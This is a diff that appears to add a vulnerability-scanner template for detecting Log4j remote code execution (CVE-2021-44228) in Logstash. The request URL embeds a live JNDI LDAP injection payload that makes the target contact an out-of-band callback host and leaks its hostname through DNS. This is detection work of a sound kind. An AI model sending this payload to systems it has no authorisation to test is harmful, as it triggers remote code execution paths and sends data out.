@@ -1,0 +1,30 @@
+id: logstash-log4j-rce
+brief:
+    title: Logstash - Remote Code Execution (Apache Log4j)
+    by: shaikhyaser
+    level: critical
+    about: Logstash is susceptible to Log4j JNDI remote code execution. Logstash is a free and open server-side data processing pipeline that ingests data from a multitude of sources, transforms it, and then ...
+    label:
+        - cve
+        - cve2021
+        - rce
+        - jndi
+        - log4j
+        - logstash
+        - oast
+        - kev
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/api/logstash/pipeline/${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}'
+      head:
+        Content-Type: application/json
+        Referrer: '{{RootURL}}/app/management/ingest/pipelines/'
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
